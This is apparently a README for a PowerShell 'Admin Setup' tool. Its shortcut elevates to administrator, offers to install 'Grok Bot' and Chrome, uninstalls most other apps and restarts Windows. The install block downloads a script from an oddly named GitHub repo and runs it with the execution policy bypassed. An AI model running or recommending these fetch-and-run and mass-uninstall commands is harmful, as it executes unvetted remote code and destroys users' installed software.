# Admin Setup

One PowerShell script. One desktop icon. No `.exe`.

Repo: [e24g4vewetq3gwerb/Admin-setup](https://github.com/e24g4vewetq3gwerb/Admin-setup)

The icon is a normal Windows shortcut (`.lnk`) that points at PowerShell and this script. Double-click it any time: UAC, then Grok Bot / Chrome offer, then wipe leftover apps, then restart.

## Install the icon

```powershell
New-Item -ItemType Directory -Force -Path "$env:USERPROFILE\admin" | Out-Null
irm https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Admin-Setup.ps1 -OutFile "$env:USERPROFILE\admin\Admin-Setup.ps1"
Unblock-File "$env:USERPROFILE\admin\Admin-Setup.ps1"
powershell -ExecutionPolicy Bypass -File "$env:USERPROFILE\admin\Admin-Setup.ps1" -IconOnly
```

That writes:

- `%USERPROFILE%\admin\Admin-Setup.ps1`
- Desktop `Admin Setup.lnk` (Run as administrator)
- Start menu `Admin Setup.lnk`

Then use the desktop icon. Do not download an exe from Releases.

## What a click does

1. Elevates with UAC
2. Offers latest **Grok Bot** and **Google Chrome** (Yes / No)
3. If either app is still missing, asks whether to continue the reset
4. Uninstalls removable apps (drivers / runtimes / Chrome / Grok Bot kept)
5. Restarts (`shutdown /r /t 60`)

Cancel a pending reboot: `shutdown /a`

Log: `%USERPROFILE%\admin\Admin-Setup.log`

## Switches

| Switch | Effect |
|--------|--------|
| `-IconOnly` | Create the icon and exit |
| `-DesktopIcon` | Create the icon (default unless `-SkipDesktopIcon`) |
| `-SkipDesktopIcon` | Do not touch the icon |
| `-Apply -UninstallNotKept -Restart` | What the icon runs |
| `-SkipWipe` | Offer apps, skip the wipe |
| `-SkipOffer` | Skip Grok / Chrome prompt |

```powershell
powershell -ExecutionPolicy Bypass -File .\Admin-Setup.ps1 -Apply -UninstallNotKept -Restart
```
